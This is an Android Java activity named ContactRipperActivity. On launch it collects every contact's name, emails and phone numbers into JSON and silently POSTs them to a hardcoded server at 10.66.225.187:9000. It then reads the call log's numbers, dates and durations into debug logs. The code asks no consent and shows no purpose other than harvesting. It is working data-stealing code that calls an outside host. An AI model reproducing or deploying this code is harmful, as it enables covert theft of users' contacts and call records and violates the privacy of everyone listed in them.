package com.sharad.android;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.Iterator;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.StringEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import android.app.Activity;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.BaseColumns;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.ContactsContract.CommonDataKinds.Email;
import android.util.Log;

public class ContactRipperActivity extends Activity {
	public static final String NAME = "name";
	public static final String EMAILS = "emails";
	public static final String PHONES = "phones";
	public static final String CONTACT_TAG = "contact";
	public static final int PICK_CONTACT = 0;

	/** Called when the activity is first created. */
	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.main);
		JSONObject map = new JSONObject();
		Cursor cur = getContentResolver().query(
				ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
		if (cur.getCount() > 0) {
			while (cur.moveToNext()) {
				String id = cur.getString(cur.getColumnIndex(BaseColumns._ID));
				String contactName = cur
						.getString(cur
								.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
				JSONObject contact = null;
				try {
					contact = map.getJSONObject(contactName);
				} catch (Exception e) {
					contact = new JSONObject();
					try {
						contact.put(NAME, contactName);
					} catch (JSONException e1) {
						e1.printStackTrace();
					}
				}
				Cursor phones = getContentResolver().query(
						ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
						null,
						ContactsContract.CommonDataKinds.Phone.CONTACT_ID
								+ " = ?", new String[] { id }, null);
				Cursor emails = getContentResolver().query(Email.CONTENT_URI,
						null, Email.CONTACT_ID + " = " + id, null, null);
				Log.d("contact", "Grabbing emails");
				if (emails != null) {
					while (emails.moveToNext()) {
						String emailString = emails.getString(emails
								.getColumnIndex(Email.DATA));
						try {
							JSONArray email = contact.getJSONArray(EMAILS);
							email.put(emailString);
						} catch (JSONException e) {
							JSONArray em = new JSONArray();
							try {
								contact.put(EMAILS, em);
							} catch (JSONException e2) {
								e2.printStackTrace();
							}
							em.put(emailString);
							try {
								map.put(contactName, contact);
							} catch (JSONException e1) {
								e1.printStackTrace();
							}
						}
					}
					emails.close();
				}
				if (phones != null) {
					while (phones.moveToNext()) {
						String phoneNumber = fixPhoneNumber(phones
								.getString(phones
										.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
						try {
							JSONArray phone = contact.getJSONArray(PHONES);
							phone.put(phoneNumber);
						} catch (JSONException e) {
							JSONArray phone = new JSONArray();
							try {
								contact.put(PHONES, phone);
							} catch (JSONException e2) {
								e2.printStackTrace();
							}
							phone.put(phoneNumber);
							try {
								map.put(contactName, contact);
							} catch (JSONException e1) {
								e1.printStackTrace();
							}
						}
					}
					phones.close();
				}

			}
		}
		cur.close();
		JSONArray output = new JSONArray();
		Iterator<?> keys = map.keys();

		while (keys.hasNext()) {
			String key = (String) keys.next();
			try {
				output.put(map.get(key));
			} catch (JSONException e) {
				e.printStackTrace();
			}
		}
		Log.d("contact", output.toString());
		// Create a new HttpClient and Post Header
		HttpClient httpclient = new DefaultHttpClient();
		HttpPost httppost = new HttpPost("http://10.66.225.187:9000");

		try {
			// Add your data
			List<NameValuePair> nameValuePairs = new ArrayList<NameValuePair>(2);
			nameValuePairs.add(new BasicNameValuePair("id", "12345"));
			nameValuePairs.add(new BasicNameValuePair("stringdata",
					"AndDev is Cool!"));
			Log.d("server", output.toString());
			httppost.setEntity(new StringEntity(output.toString()));
			// Execute HTTP Post Request
			HttpResponse response = httpclient.execute(httppost);
			Log.d("server", response.toString());

		} catch (Exception e) {
			Log.e("server", "error", e);
			e.printStackTrace();
		}
		String[] projection = new String[] { CallLog.Calls._ID,
				CallLog.Calls.NUMBER, CallLog.Calls.DATE,
				CallLog.Calls.DURATION };
		Cursor query = this.managedQuery(CallLog.Calls.CONTENT_URI, projection,
				null, null, null);

		while (query.moveToNext()) {
			Log.d("contact", fixPhoneNumber(query.getString(1)) + ": "
					+ new Date(Long.parseLong(query.getString(2))) + "; "
					+ query.getString(3));
		}
	}

	public String fixPhoneNumber(String number) {
		number = number.replace("-", "").replace("\\.", "").replace(" ", "");
		if (number.length() == 10) {
			number = "1" + number;
		}
		return number;
	}
}